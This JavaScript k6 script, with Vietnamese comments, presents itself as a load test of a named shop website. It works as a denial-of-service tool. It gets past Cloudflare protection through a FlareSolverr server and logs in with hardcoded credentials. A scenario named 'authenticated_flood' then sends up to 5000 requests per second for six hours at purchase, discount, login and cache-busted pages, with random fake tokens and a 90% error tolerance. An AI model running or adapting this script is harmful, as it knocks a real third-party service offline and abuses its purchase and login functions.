import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

/* ==================================================================
   K6 AUTHENTICATED LOAD TEST - thanhhuyreal.com
   - Bypass Cloudflare qua FlareSolverr server (https://fs.duongle.dev)
   - Mỗi VU tự động get cf_clearance cookie
   - Hit authenticated API endpoints với session đã login
   - Multi-endpoint: purchase, discount, login...
   ================================================================== */

const IP_URL  = (__ENV.IP_URL   || 'https://thanhhuyreal.com').replace(/\/+$/, '');
const HOST    = __ENV.SITE_HOST || 'thanhhuyreal.com';
const FLARESOLVERR_URL = __ENV.FLARESOLVERR_URL || 'https://fs.duongle.dev';

const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';

// ===== Config =====
const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,360m:5000';
const START_RATE  = parseInt(__ENV.START_RATE  || '100',  10);
const PRE_VUS     = parseInt(__ENV.PRE_VUS     || '500',  10);
const MAX_VUS     = parseInt(__ENV.MAX_VUS     || '8000', 10);
const TIMEOUT     = __ENV.REQUEST_TIMEOUT      || '30s';
const MAX_ERR     = parseFloat(__ENV.MAX_ERR_RATE || '0.9');

// ===== Parse STAGES =====
const STAGES = STAGES_RAW.split(',').map(p => {
  const [d, t] = p.trim().split(':');
  return { duration: d.trim(), target: parseInt(t, 10) };
});

// ===== Helper: Get cf_clearance từ FlareSolverr =====
function getCfClearance() {
  const flareRes = http.post(`${FLARESOLVERR_URL}/v1`, 
    JSON.stringify({
      cmd: "request.get",
      url: IP_URL,
      maxTimeout: 60000
    }),
    { 
      headers: { 'Content-Type': 'application/json' },
      timeout: '70s',
    }
  );
  
  if (flareRes.status !== 200) {
    console.warn(`FlareSolverr failed: ${flareRes.status}`);
    return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
  }
  
  const data = flareRes.json();
  if (data.status !== 'ok') {
    console.warn(`FlareSolverr error: ${data.message || 'unknown'}`);
    return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
  }
  
  const cookies = data.solution.cookies || [];
  const cfCookie = cookies.find(c => c.name === 'cf_clearance');
  const userAgent = data.solution.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
  
  return {
    cfClearance: cfCookie ? cfCookie.value : '',
    userAgent: userAgent
  };
}

// ===== Headers chung (dung session + cf_clearance) =====
function makeHeaders(session, cfClearance, userAgent) {
  let cookie = `PHPSESSID=${session}`;
  if (cfClearance) {
    cookie += `; cf_clearance=${cfClearance}`;
  }
  
  const headers = {
    'Cookie':           cookie,
    'User-Agent':       userAgent,
    'Accept':           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language':  'vi-VN,vi;q=0.9,en;q=0.8',
    'Accept-Encoding':  'gzip, deflate, br',
    'Connection':       'keep-alive',
    'Cache-Control':    'no-cache',
    'Pragma':           'no-cache',
  };
  
  return headers;
}

function makeApiHeaders(session, cfClearance, userAgent) {
  return Object.assign({}, makeHeaders(session, cfClearance, userAgent), {
    'Accept':           'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
  });
}

// ===== Endpoints thực tế từ thanhhuyreal.com =====
const HEAVY_APIS = [
  () => ({
    url: `${IP_URL}/model/account/purchase`,
    body: `csrf_token=${getCsrfToken()}&account_id=${randomIntBetween(1,1000000)}&category_id=${randomIntBetween(1,500)}&price=${randomIntBetween(1,50)*1000}&total_price=${randomIntBetween(1,50)*1000}&membership_percentage=0`,
  }),
  
  () => ({
    url: `${IP_URL}/model/discount/apply`,
    body: `csrf_token=${getCsrfToken()}&code=${randomItem(['xc','sale','vip','promo','discount'])}&category_id=${randomIntBetween(1,500)}&quantity=${randomIntBetween(1,5)}`,
  }),
  
  () => ({
    url: `${IP_URL}/model/login`,
    body: `csrf_token=${getCsrfToken()}&identifier=${IDENTIFIER}&password=${PASSWORD}`,
  }),
];

const HEAVY_PAGES = [
  () => `${IP_URL}/?_=${Date.now()}&r=${randomIntBetween(1, 99999)}`,
  () => `${IP_URL}/mua-acc?_=${Date.now()}`,
  () => `${IP_URL}/mua-acc/full-ruong-380-ve?_=${Date.now()}`,
  () => `${IP_URL}/mua-acc/random-skin-3s-sale?_=${Date.now()}`,
];

function getCsrfToken() {
  const chars = '0123456789abcdef';
  let token = '';
  for (let i = 0; i < 64; i++) {
    token += chars[Math.floor(Math.random() * chars.length)];
  }
  return token;
}

// ===== Metrics =====
const req2xx   = new Counter('req_2xx');
const req4xx   = new Counter('req_4xx');
const req5xx   = new Counter('req_5xx');
const reqErr   = new Counter('req_error');
const errRate  = new Rate('error_rate');
const reqDur   = new Trend('req_duration');

// ===== Setup: Get cf_clearance + Login 1 lần =====
export function setup() {
  console.log('=== SETUP: Get cf_clearance from FlareSolverr ===');
  console.log(`FlareSolverr: ${FLARESOLVERR_URL}`);
  console.log(`Target: ${IP_URL}`);
  
  const { cfClearance, userAgent } = getCfClearance();
  
  if (!cfClearance) {
    console.warn('⚠ No cf_clearance obtained, will try without it');
  } else {
    console.log(`✓ cf_clearance: ${cfClearance.substring(0, 50)}...`);
  }
  console.log(`User-Agent: ${userAgent.substring(0, 80)}...`);
  
  // Login để lấy PHPSESSID
  console.log('=== Auto-login: GET csrf token ===');
  
  const loginHeaders = {
    'User-Agent': userAgent,
    'Accept': 'text/html,application/xhtml+xml',
  };
  
  if (cfClearance) {
    loginHeaders['Cookie'] = `cf_clearance=${cfClearance}`;
  }
  
  const loginPageRes = http.get(`${IP_URL}/?auth=login`, {
    headers: loginHeaders,
    responseType: 'text',
    timeout: '30s',
  });

  if (loginPageRes.status !== 200) {
    console.error(`GET login page failed: status=${loginPageRes.status}`);
    return { session: '', cfClearance: cfClearance, userAgent: userAgent };
  }

  // Extract csrf_token
  const csrfMatch = loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/);
  if (!csrfMatch) {
    console.error('csrf_token not found in HTML');
    return { session: '', cfClearance: cfClearance, userAgent: userAgent };
  }
  const csrfToken = csrfMatch[1];
  console.log(`CSRF: ${csrfToken.substring(0, 10)}...`);

  // Extract PHPSESSID
  const cookiesObj = loginPageRes.cookies;
  const phpSessId = (cookiesObj['PHPSESSID'] && cookiesObj['PHPSESSID'][0])
    ? cookiesObj['PHPSESSID'][0].value
    : '';
  console.log(`PHPSESSID: ${phpSessId ? phpSessId.substring(0, 8) + '...' : 'NOT FOUND'}`);

  // POST login
  const loginBody = [
    `csrf_token=${encodeURIComponent(csrfToken)}`,
    `identifier=${encodeURIComponent(IDENTIFIER)}`,
    `password=${encodeURIComponent(PASSWORD)}`,
  ].join('&');

  let loginCookie = `PHPSESSID=${phpSessId}`;
  if (cfClearance) {
    loginCookie += `; cf_clearance=${cfClearance}`;
  }
  
  const loginRes = http.post(`${IP_URL}/model/login`, loginBody, {
    headers: {
      'Cookie': loginCookie,
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': userAgent,
      'Referer': `${IP_URL}/?auth=login`,
    },
    responseType: 'text',
    timeout: '30s',
  });

  console.log(`Login response status: ${loginRes.status}`);

  let json = null;
  try { json = loginRes.json(); } catch(e) {}

  if (json && json.status === true) {
    console.log(`✓ Login SUCCESS! Session: ${phpSessId.substring(0, 8)}...`);
    return { session: phpSessId, cfClearance: cfClearance, userAgent: userAgent };
  } else {
    const msg = json ? JSON.stringify(json) : (loginRes.body || '').substring(0, 100);
    console.warn(`Login failed: ${msg}`);
    return { session: phpSessId, cfClearance: cfClearance, userAgent: userAgent };
  }
}

export const options = {
  discardResponseBodies: true,
  setupTimeout: '120s',
  scenarios: {
    authenticated_flood: {
      executor:        'ramping-arrival-rate',
      startRate:       START_RATE,
      timeUnit:        '1s',
      preAllocatedVUs: PRE_VUS,
      maxVUs:          MAX_VUS,
      stages:          STAGES,
      exec:            'default',
    },
  },
  thresholds: {
    error_rate: [`rate<${MAX_ERR}`],
  },
};

// ===== Hit trang HTML nặng =====
function hitPage(data) {
  const HEADERS = makeHeaders(data.session, data.cfClearance, data.userAgent);
  const fn  = HEAVY_PAGES[randomIntBetween(0, HEAVY_PAGES.length - 1)];
  const url = fn();
  const res = http.get(url, { headers: HEADERS, timeout: TIMEOUT, tags: { name: 'page' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'khong 5xx': r => r.status < 500 });
}

// ===== Hit API POST nặng =====
function hitApi(data) {
  const API_HEADERS = makeApiHeaders(data.session, data.cfClearance, data.userAgent);
  const fn  = HEAVY_APIS[randomIntBetween(0, HEAVY_APIS.length - 1)];
  const { url, body } = fn();
  const res = http.post(url, body, { headers: API_HEADERS, timeout: TIMEOUT, tags: { name: 'api' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'api khong 5xx': r => r.status < 500 });
}

// ===== Main test function =====
export default function (data) {
  if (!data.session) {
    console.error('No session, skipping VU');
    return;
  }
  
  // 70% API, 30% pages
  if (Math.random() < 0.7) {
    hitApi(data);
  } else {
    hitPage(data);
  }
}
